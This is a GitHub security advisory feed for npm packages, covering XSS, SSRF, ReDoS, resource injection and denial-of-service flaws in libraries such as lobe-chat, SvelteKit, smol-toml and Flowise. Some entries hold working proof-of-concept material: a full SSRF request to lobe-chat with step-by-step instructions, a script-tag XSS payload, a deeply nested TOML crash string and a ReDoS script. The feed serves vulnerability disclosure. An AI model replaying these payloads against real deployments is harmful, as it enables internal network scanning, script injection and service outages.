<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2024-11-30T14:01:15.537Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[@dapperduckling/keycloak-connector-server] @dapperduckling/keycloak-connector-server has Reflected XSS Vulnerability in Authentication Flow URL Handling]]></title>
        <id>https://github.com/advisories/GHSA-w5rq-g9r6-vrcg</id>
        <link href="https://github.com/advisories/GHSA-w5rq-g9r6-vrcg"/>
        <updated>2024-11-26T16:51:06.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Impact</strong>
A Reflected Cross-Site Scripting (XSS) vulnerability was discovered in the authentication flow of the application. This issue arises due to improper sanitization of the URL parameters, allowing the URL bar's contents to be injected and reflected into the HTML page. An attacker could craft a malicious URL to execute arbitrary JavaScript in the browser of a victim who visits the link.</p>
<p><strong>Who is impacted?</strong>
Any application utilizing this authentication library is vulnerable. Users of the application are at risk if they can be lured into clicking on a crafted malicious link.</p>
<p><strong>Patches</strong>
The vulnerability has been patched in <strong>2.5.5</strong> by ensuring proper sanitization and escaping of user input in the affected URL parameters.</p>
<p>Users are strongly encouraged to upgrade to the following versions:</p>
<p><strong>Workarounds</strong>
If upgrading is not immediately possible, users can implement the following workarounds:</p>
<ul>
<li>Employ a Web Application Firewall (WAF) to block malicious requests containing suspicious URL parameters.</li>
<li>Apply input validation and escaping directly within the applicationâ€™s middleware or reverse proxy layer, specifically targeting the affected parameters.</li>
</ul>
<p><strong>References</strong></p>
<ul>
<li>OWASP Cross-Site Scripting (XSS) Cheat Sheet: <a href="https://owasp.org/www-community/attacks/xss/">https://owasp.org/www-community/attacks/xss/</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/DapperDuckling/keycloak-connector/security/advisories/GHSA-w5rq-g9r6-vrcg">https://github.com/DapperDuckling/keycloak-connector/security/advisories/GHSA-w5rq-g9r6-vrcg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53843">https://nvd.nist.gov/vuln/detail/CVE-2024-53843</a></li>
<li><a href="https://github.com/advisories/GHSA-w5rq-g9r6-vrcg">https://github.com/advisories/GHSA-w5rq-g9r6-vrcg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w5rq-g9r6-vrcg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-11-26T16:51:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@lobehub/chat] @lobehub/chat Server Side Request Forgery vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-2xcc-vm3f-m8rw</id>
        <link href="https://github.com/advisories/GHSA-2xcc-vm3f-m8rw"/>
        <updated>2024-11-26T21:43:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>lobe-chat before 1.19.13 has an unauthorized ssrf vulnerability. An attacker can construct malicious requests to cause SSRF without logging in, attack intranet services, and leak sensitive information.</p>
<h3 id="details">Details</h3>
<ul>
<li>visit <a href="https://chat-preview.lobehub.com/">https://chat-preview.lobehub.com/</a></li>
<li>click settings -&gt; llm -&gt; openai</li>
<li>fill the OpenAI API Key you like</li>
<li>fill the proxy address that you want to attack (e.g. a domain that resolved to a local ip addr like 127.0.0.1.xip.io) (the address will concat the path "/chat/completions" which can be bypassed with sharp like "<a href="http://172.23.0.1:8000/#">http://172.23.0.1:8000/#</a>")</li>
<li>then lobe will echo the ssrf result</li>
</ul>
<p>The jwt token header X-Lobe-Chat-Auth strored proxy address and OpenAI API Key, you can modify it to scan internal network in your target lobe-web.</p>
<p><img alt="image" src="https://github.com/lobehub/lobe-chat/assets/55245002/d55e21e0-59d8-4a8e-8c56-4bcda3302dc2"></p>
<p><img alt="image" src="https://github.com/lobehub/lobe-chat/assets/55245002/86833362-4e9e-4d07-9542-420db541f7a4"></p>
<p><img alt="image" src="https://github.com/lobehub/lobe-chat/assets/55245002/d8891a1b-5b6f-434d-8125-8da46055a935"></p>
<h3 id="poc">PoC</h3>
<pre><code class="language-http">POST /api/chat/openai HTTP/2
Host: chat-preview.lobehub.com
Cookie: LOBE_LOCALE=zh-CN; LOBE_THEME_PRIMARY_COLOR=undefined; LOBE_THEME_NEUTRAL_COLOR=undefined; _ga=GA1.1.86608329.1711346216; _ga_63LP1TV70T=GS1.1.1711346215.1.1.1711346244.0.0.0
Content-Length: 158
Sec-Ch-Ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"
X-Lobe-Chat-Auth: eyJhbGciOiJIUzI1NiJ9.eyJhY2Nlc3NDb2RlIjoiIiwiYXBpS2V5IjoiMSIsImVuZHBvaW50IjoiaHR0cDovLzEyNy4wLjAuMS54aXAuaW86MzIxMCIsImlhdCI6MTcxMTM0NjI1MCwiZXhwIjoxNzExMzQ2MzUwfQ.ZZ3v3q9T8E6llOVGOA3ep5OSVoFEawswEfKtufCcwL4
Content-Type: application/json
X-Lobe-Trace: eyJlbmFibGVkIjpmYWxzZX0=
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Origin: https://chat-preview.lobehub.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://chat-preview.lobehub.com/settings/llm
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7
Connection: close

{"model":"gpt-3.5-turbo","stream":true,"frequency_penalty":0,"presence_penalty":0,"temperature":0.6,"top_p":1,"messages":[{"content":"hello","role":"user"}]}
</code></pre>
<h3 id="impact">Impact</h3>
<p>SSRF, All users will be impacted.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lobehub/lobe-chat/security/advisories/GHSA-2xcc-vm3f-m8rw">https://github.com/lobehub/lobe-chat/security/advisories/GHSA-2xcc-vm3f-m8rw</a></li>
<li><a href="https://github.com/lobehub/lobe-chat/commit/e960a23b0c69a5762eb27d776d33dac443058faf">https://github.com/lobehub/lobe-chat/commit/e960a23b0c69a5762eb27d776d33dac443058faf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32965">https://nvd.nist.gov/vuln/detail/CVE-2024-32965</a></li>
<li><a href="https://github.com/advisories/GHSA-2xcc-vm3f-m8rw">https://github.com/advisories/GHSA-2xcc-vm3f-m8rw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2xcc-vm3f-m8rw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-11-26T15:39:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[express] Express ressource injection]]></title>
        <id>https://github.com/advisories/GHSA-cm5g-3pgc-8rg4</id>
        <link href="https://github.com/advisories/GHSA-cm5g-3pgc-8rg4"/>
        <updated>2024-11-25T21:31:21.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability has been identified in the Express response.links&nbsp;function, allowing for arbitrary resource injection in the Link&nbsp;header when unsanitized data is used.</p>
<p>The issue arises from improper sanitization in <code>Link</code> header values, which can allow a combination of characters like <code>,</code>, <code>;</code>, and <code>&lt;&gt;</code> to preload malicious resources.</p>
<p>This vulnerability is especially relevant for dynamic parameters.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-10491">https://nvd.nist.gov/vuln/detail/CVE-2024-10491</a></li>
<li><a href="https://www.herodevs.com/vulnerability-directory/cve-2024-10491">https://www.herodevs.com/vulnerability-directory/cve-2024-10491</a></li>
<li><a href="https://github.com/advisories/GHSA-cm5g-3pgc-8rg4">https://github.com/advisories/GHSA-cm5g-3pgc-8rg4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cm5g-3pgc-8rg4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-29T18:30:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@sveltejs/kit] @sveltejs/kit vulnerable to on dev mode 404 page]]></title>
        <id>https://github.com/advisories/GHSA-rjjv-87mx-6x3h</id>
        <link href="https://github.com/advisories/GHSA-rjjv-87mx-6x3h"/>
        <updated>2024-11-25T21:47:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>"Unsanitized input from <em>the request URL</em> flows into <code>end</code>, where it is used to render an HTML page returned to the user. This may result in a Cross-Site Scripting attack (XSS)."</p>
<h3 id="details">Details</h3>
<p>Source of potentially tainted data is in <code>packages/kit/src/exports/vite/dev/index.js</code>, line 437. This potentially tainted data is passed through a number of steps (which I could detail if you'd like) all the way down to line 91 in <code>packages/kit/src/exports/vite/utils.js</code>, which performs an operation that Snyk believes an attacker shouldn't be allowed to manipulate.</p>
<p>Another source of potentially tainted data (according to Snyk) comes from <code>â€Žpackages/kit/src/exports/vite/utils.js</code>, line 30, col 30 (i.e., the <code>url</code> property of <code>req</code>). This potentially tainted data is passed through a number of steps (which I could detail if you'd like) all the way down line 91 in <code>packages/kit/src/exports/vite/utils.js</code>, which performs an operation that Snyk believes an attacker shouldn't be allowed to manipulate.</p>
<h3 id="poc">PoC</h3>
<p>Not provided</p>
<h3 id="impact">Impact</h3>
<p>Little to none. The Vite development is not exposed to the network by default. And even if someone were able to trick a developer into executing an XSS against themselves, a development database should not have any sensitive data.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sveltejs/kit/security/advisories/GHSA-rjjv-87mx-6x3h">https://github.com/sveltejs/kit/security/advisories/GHSA-rjjv-87mx-6x3h</a></li>
<li><a href="https://github.com/sveltejs/kit/pull/13039">https://github.com/sveltejs/kit/pull/13039</a></li>
<li><a href="https://github.com/sveltejs/kit/releases/tag/%40sveltejs%2Fkit%402.8.3">https://github.com/sveltejs/kit/releases/tag/%40sveltejs%2Fkit%402.8.3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53261">https://nvd.nist.gov/vuln/detail/CVE-2024-53261</a></li>
<li><a href="https://github.com/sveltejs/kit/commit/d338d4635a7fd947ba5112df6ee632c4a0979438">https://github.com/sveltejs/kit/commit/d338d4635a7fd947ba5112df6ee632c4a0979438</a></li>
<li><a href="https://github.com/advisories/GHSA-rjjv-87mx-6x3h">https://github.com/advisories/GHSA-rjjv-87mx-6x3h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rjjv-87mx-6x3h</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-11-25T15:33:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@sveltejs/kit] @sveltejs/kit has unescaped error message included on error page]]></title>
        <id>https://github.com/advisories/GHSA-mh2x-fcqh-fmqv</id>
        <link href="https://github.com/advisories/GHSA-mh2x-fcqh-fmqv"/>
        <updated>2024-11-25T21:46:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The static error.html template for errors contains placeholders that are replaced without escaping the content first.</p>
<h3 id="details">Details</h3>
<p>From <a href="https://kit.svelte.dev/docs/errors">https://kit.svelte.dev/docs/errors</a>:</p>
<blockquote>
<p>error.html is the page that is rendered when everything else fails. It can contain the following placeholders:
%sveltekit.status% â€” the HTTP status
%sveltekit.error.message% â€” the error message</p>
</blockquote>
<p>This leads to possible injection if an app explicitly creates an error with a message that contains user controlled content that ends up being something like this inside a server handle function: </p>
<pre><code class="language-js">error(500, '&lt;script&gt;alert("boom")&lt;/script&gt;');
</code></pre>
<p>Uncaught errors cannot be exploited like this, as they always render the message "Internal error".</p>
<p>Escaping the message string in the function that creates the html output can be done to improve safety for applications that are using custom errors on the server.</p>
<h3 id="poc">PoC</h3>
<p>None provided</p>
<h3 id="impact">Impact</h3>
<p>Only applications where user provided input is used in the <code>Error</code> message will be vulnerable, so the vast majority of applications will not be vulnerable</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sveltejs/kit/security/advisories/GHSA-mh2x-fcqh-fmqv">https://github.com/sveltejs/kit/security/advisories/GHSA-mh2x-fcqh-fmqv</a></li>
<li><a href="https://github.com/sveltejs/kit/pull/13050">https://github.com/sveltejs/kit/pull/13050</a></li>
<li><a href="https://github.com/sveltejs/kit/releases/tag/%40sveltejs%2Fkit%402.8.3">https://github.com/sveltejs/kit/releases/tag/%40sveltejs%2Fkit%402.8.3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53262">https://nvd.nist.gov/vuln/detail/CVE-2024-53262</a></li>
<li><a href="https://github.com/sveltejs/kit/commit/134e36343ef57ed7e6e2b3bb9e7f05ad37865794">https://github.com/sveltejs/kit/commit/134e36343ef57ed7e6e2b3bb9e7f05ad37865794</a></li>
<li><a href="https://kit.svelte.dev/docs/errors">https://kit.svelte.dev/docs/errors</a></li>
<li><a href="https://github.com/advisories/GHSA-mh2x-fcqh-fmqv">https://github.com/advisories/GHSA-mh2x-fcqh-fmqv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mh2x-fcqh-fmqv</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-11-25T15:32:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[smol-toml] smol-toml has a Denial of Service via malicious TOML document using deeply nested inline tables]]></title>
        <id>https://github.com/advisories/GHSA-pqhp-25j4-6hq9</id>
        <link href="https://github.com/advisories/GHSA-pqhp-25j4-6hq9"/>
        <updated>2024-11-22T20:40:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An attacker can send a maliciously crafted TOML to cause the parser to crash because of a stack overflow caused by a deeply nested inline structure. A similar problem occurs when attempting to stringify deeply nested objects.</p>
<p>The library does not limit the maximum exploration depth while parsing or producing TOML documents, nor does it offer a way to do so.</p>
<h3 id="proof-of-concept">Proof of concept</h3>
<pre><code class="language-js">require("smol-toml").parse("e=" + "{e=".repeat(9999) + "{}" + "}".repeat(9999))
</code></pre>
<h3 id="impact">Impact</h3>
<p>Applications which parse arbitrary TOML documents may suffer availability issues if they receive malicious input. If uncaught, the crash may cause the application itself to crash. The impact is deemed minor, as the function is already likely to throw errors on invalid input and therefore to properly handle errors.</p>
<p>Due to the design of most JavaScript runtimes, the uncontrolled recursion does not lead to excessive memory usage and the execution is quickly aborted.</p>
<p>As a reminder, it is <strong>strongly</strong> advised when working with untrusted user input to expect errors to occur and to appropriately catch them.</p>
<h3 id="patches">Patches</h3>
<p>Version 1.3.1 offers a mechanism to limit the exploration depth before halting with a <code>TomlError</code> when parsing, with a default cap of 1000. A same mechanism has been implemented for stringifying objects.</p>
<p><strong>Please note that the parser will <em>still</em> throw an error upon such cases.</strong> It is, however, a now-controlled and documented behavior of the library.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Wrap all invocations of <code>parse</code> and <code>stringify</code> in a try/catch block.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/squirrelchat/smol-toml/security/advisories/GHSA-pqhp-25j4-6hq9">https://github.com/squirrelchat/smol-toml/security/advisories/GHSA-pqhp-25j4-6hq9</a></li>
<li><a href="https://github.com/squirrelchat/smol-toml/commit/405108ba090f0fc78f99aa2f0d6721e499b0ff27">https://github.com/squirrelchat/smol-toml/commit/405108ba090f0fc78f99aa2f0d6721e499b0ff27</a></li>
<li><a href="https://github.com/advisories/GHSA-pqhp-25j4-6hq9">https://github.com/advisories/GHSA-pqhp-25j4-6hq9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pqhp-25j4-6hq9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-11-22T20:40:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] Flowise OverrideConfig security vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-5cph-wvm9-45gj</id>
        <link href="https://github.com/advisories/GHSA-5cph-wvm9-45gj"/>
        <updated>2024-11-21T22:21:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Flowise allows developers to inject configuration into the Chainflow during execution through the <code>overrideConfig</code> option. This is supported in both the frontend web integration and the backend Prediction API. </p>
<p>This has a range of fundamental issues that are a <strong>major</strong> security vulnerability. 
While this feature is intentional, it should have strong protections added and be disabled by default. </p>
<p>These issues include: </p>
<ol>
<li>Remote code execution. While inside a sandbox this allows for</li>
<li>Sandbox escape </li>
<li>DoS by crashing the server</li>
<li>SSRF</li>
<li>Prompt Injection, both System and User</li>
<li>Full control over LLM prompts</li>
<li>Server variable and data exfiltration
And many many more such as altering the flow of a conversation, prompt exfiltration via LLM proxying etc.</li>
</ol>
<p>These issues are self-targeted and do not persist to other users but do leave the server and business exposed. 
All issues are shown with the API but also work with the web embed.</p>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li><code>overrideConfig</code> should be disabled by default</li>
<li><code>overrideConfig</code> should have an explicit allow list of variables that are allowed to be modified. This way the user opts-in to where modifications can be made. </li>
<li><code>vm2</code> and any forks of it should be removed as in the authors own words, "fixing the vulnerability seems impossible". The recommended replacement is <a href="https://www.npmjs.com/package/isolated-vm">https://www.npmjs.com/package/isolated-vm</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-5cph-wvm9-45gj">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-5cph-wvm9-45gj</a></li>
<li><a href="https://github.com/advisories/GHSA-5cph-wvm9-45gj">https://github.com/advisories/GHSA-5cph-wvm9-45gj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5cph-wvm9-45gj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-11-21T22:21:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bootstrap] Bootstrap Cross-Site Scripting (XSS) vulnerability for data-* attributes]]></title>
        <id>https://github.com/advisories/GHSA-vxmc-5x29-h64v</id>
        <link href="https://github.com/advisories/GHSA-vxmc-5x29-h64v"/>
        <updated>2024-11-18T23:46:01.000Z</updated>
        <content type="html"><![CDATA[<p>A security vulnerability has been discovered in bootstrap that could enable Cross-Site Scripting (XSS) attacks. The vulnerability is associated with the data-loading-text attribute within the button plugin. This vulnerability can be exploited by injecting malicious JavaScript code into the attribute, which would then be executed when the button's loading state is triggered.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6485">https://nvd.nist.gov/vuln/detail/CVE-2024-6485</a></li>
<li><a href="https://www.herodevs.com/vulnerability-directory/cve-2024-6485">https://www.herodevs.com/vulnerability-directory/cve-2024-6485</a></li>
<li><a href="https://github.com/advisories/GHSA-vxmc-5x29-h64v">https://github.com/advisories/GHSA-vxmc-5x29-h64v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vxmc-5x29-h64v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-11T18:31:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cross-spawn] Regular Expression Denial of Service (ReDoS) in cross-spawn]]></title>
        <id>https://github.com/advisories/GHSA-3xgq-45jj-v275</id>
        <link href="https://github.com/advisories/GHSA-3xgq-45jj-v275"/>
        <updated>2024-11-19T16:19:50.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21538">https://nvd.nist.gov/vuln/detail/CVE-2024-21538</a></li>
<li><a href="https://github.com/moxystudio/node-cross-spawn/pull/160">https://github.com/moxystudio/node-cross-spawn/pull/160</a></li>
<li><a href="https://github.com/moxystudio/node-cross-spawn/commit/5ff3a07d9add449021d806e45c4168203aa833ff">https://github.com/moxystudio/node-cross-spawn/commit/5ff3a07d9add449021d806e45c4168203aa833ff</a></li>
<li><a href="https://github.com/moxystudio/node-cross-spawn/commit/640d391fde65388548601d95abedccc12943374f">https://github.com/moxystudio/node-cross-spawn/commit/640d391fde65388548601d95abedccc12943374f</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-CROSSSPAWN-8303230">https://security.snyk.io/vuln/SNYK-JS-CROSSSPAWN-8303230</a></li>
<li><a href="https://github.com/moxystudio/node-cross-spawn/issues/165">https://github.com/moxystudio/node-cross-spawn/issues/165</a></li>
<li><a href="https://github.com/moxystudio/node-cross-spawn/commit/d35c865b877d2f9ded7c1ed87521c2fdb689c8dd">https://github.com/moxystudio/node-cross-spawn/commit/d35c865b877d2f9ded7c1ed87521c2fdb689c8dd</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8366349">https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8366349</a></li>
<li><a href="https://github.com/advisories/GHSA-3xgq-45jj-v275">https://github.com/advisories/GHSA-3xgq-45jj-v275</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3xgq-45jj-v275</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-11-08T06:30:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cross-spawn] Regular Expression Denial of Service (ReDoS) in cross-spawn]]></title>
        <id>https://github.com/advisories/GHSA-3xgq-45jj-v275</id>
        <link href="https://github.com/advisories/GHSA-3xgq-45jj-v275"/>
        <updated>2024-11-19T16:19:50.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21538">https://nvd.nist.gov/vuln/detail/CVE-2024-21538</a></li>
<li><a href="https://github.com/moxystudio/node-cross-spawn/pull/160">https://github.com/moxystudio/node-cross-spawn/pull/160</a></li>
<li><a href="https://github.com/moxystudio/node-cross-spawn/commit/5ff3a07d9add449021d806e45c4168203aa833ff">https://github.com/moxystudio/node-cross-spawn/commit/5ff3a07d9add449021d806e45c4168203aa833ff</a></li>
<li><a href="https://github.com/moxystudio/node-cross-spawn/commit/640d391fde65388548601d95abedccc12943374f">https://github.com/moxystudio/node-cross-spawn/commit/640d391fde65388548601d95abedccc12943374f</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-CROSSSPAWN-8303230">https://security.snyk.io/vuln/SNYK-JS-CROSSSPAWN-8303230</a></li>
<li><a href="https://github.com/moxystudio/node-cross-spawn/issues/165">https://github.com/moxystudio/node-cross-spawn/issues/165</a></li>
<li><a href="https://github.com/moxystudio/node-cross-spawn/commit/d35c865b877d2f9ded7c1ed87521c2fdb689c8dd">https://github.com/moxystudio/node-cross-spawn/commit/d35c865b877d2f9ded7c1ed87521c2fdb689c8dd</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8366349">https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8366349</a></li>
<li><a href="https://github.com/advisories/GHSA-3xgq-45jj-v275">https://github.com/advisories/GHSA-3xgq-45jj-v275</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3xgq-45jj-v275</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-11-08T06:30:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[firebase] Firebase JavaScript SDK allows attackers to manipulate the "_authTokenSyncURL" to point to their own server]]></title>
        <id>https://github.com/advisories/GHSA-3wf4-68gx-mph8</id>
        <link href="https://github.com/advisories/GHSA-3wf4-68gx-mph8"/>
        <updated>2024-11-18T20:04:31.000Z</updated>
        <content type="html"><![CDATA[<p>Firebase JavaScript SDK utilizes a "FIREBASE_DEFAULTS" cookie to store configuration data, including an "_authTokenSyncURL" field used for session synchronization.  If this cookie field is preset via an attacker by any other method, the attacker can manipulate the "_authTokenSyncURL" to point to their own server and it would allow am actor to capture user session data transmitted by the SDK. We recommend upgrading Firebase JS SDK at least to 10.9.0.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-11023">https://nvd.nist.gov/vuln/detail/CVE-2024-11023</a></li>
<li><a href="https://github.com/firebase/firebase-js-sdk/pull/8056">https://github.com/firebase/firebase-js-sdk/pull/8056</a></li>
<li><a href="https://firebase.google.com/support/release-notes/js#version_1090_-_march_14_2024">https://firebase.google.com/support/release-notes/js#version_1090_-_march_14_2024</a></li>
<li><a href="https://github.com/firebase/firebase-js-sdk/commit/245dd26e19b6c16aca7e1b7e597ed5784c2984ba">https://github.com/firebase/firebase-js-sdk/commit/245dd26e19b6c16aca7e1b7e597ed5784c2984ba</a></li>
<li><a href="https://github.com/advisories/GHSA-3wf4-68gx-mph8">https://github.com/advisories/GHSA-3wf4-68gx-mph8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3wf4-68gx-mph8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-11-18T12:30:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nodebb] Incorrect Access Control in NodeBB]]></title>
        <id>https://github.com/advisories/GHSA-qc99-r4wh-c8h6</id>
        <link href="https://github.com/advisories/GHSA-qc99-r4wh-c8h6"/>
        <updated>2024-11-18T20:02:54.000Z</updated>
        <content type="html"><![CDATA[<p>In NodeBB prior to 3.6.7 an attacker was able to access the restricted tabs for the Admin group which are only allowed the the administrators.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-29316">https://nvd.nist.gov/vuln/detail/CVE-2024-29316</a></li>
<li><a href="https://medium.com/%40krityamkarma858041/broken-access-control-nodebb-v3-6-7-eebc59c24deb">https://medium.com/%40krityamkarma858041/broken-access-control-nodebb-v3-6-7-eebc59c24deb</a></li>
<li><a href="https://nodebb.org/bounty">https://nodebb.org/bounty</a></li>
<li><a href="https://github.com/advisories/GHSA-qc99-r4wh-c8h6">https://github.com/advisories/GHSA-qc99-r4wh-c8h6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qc99-r4wh-c8h6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-29T00:30:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@eslint/plugin-kit] Regular Expression Denial of Service (ReDoS) in @eslint/plugin-kit]]></title>
        <id>https://github.com/advisories/GHSA-7q7g-4xm8-89cq</id>
        <link href="https://github.com/advisories/GHSA-7q7g-4xm8-89cq"/>
        <updated>2024-11-19T20:49:58.000Z</updated>
        <content type="html"><![CDATA[<p>Crafting a very large and well crafted string can increase the CPU usage and crash the program.</p>
<h2 id="poc">POC</h2>
<pre><code class="language-js">const { ConfigCommentParser } = require("@eslint/plugin-kit");

var str = "";
for (var i = 0; i &lt; 1000000; i++) {
  str += " ";
}
str += "A";

console.log("start")
var parser = new ConfigCommentParser();
console.log(parser.parseStringConfig(str, ""));
console.log("end")

// run `npm i @eslint/plugin-kit` and `node attack.js` 
// then the program will stuck forever with high CPU usage
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/eslint/rewrite/security/advisories/GHSA-7q7g-4xm8-89cq">https://github.com/eslint/rewrite/security/advisories/GHSA-7q7g-4xm8-89cq</a></li>
<li><a href="https://github.com/eslint/rewrite/commit/071be842f0bd58de4863cdf2ab86d60f49912abf">https://github.com/eslint/rewrite/commit/071be842f0bd58de4863cdf2ab86d60f49912abf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21539">https://nvd.nist.gov/vuln/detail/CVE-2024-21539</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-ESLINTPLUGINKIT-8340627">https://security.snyk.io/vuln/SNYK-JS-ESLINTPLUGINKIT-8340627</a></li>
<li><a href="https://github.com/advisories/GHSA-7q7g-4xm8-89cq">https://github.com/advisories/GHSA-7q7g-4xm8-89cq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
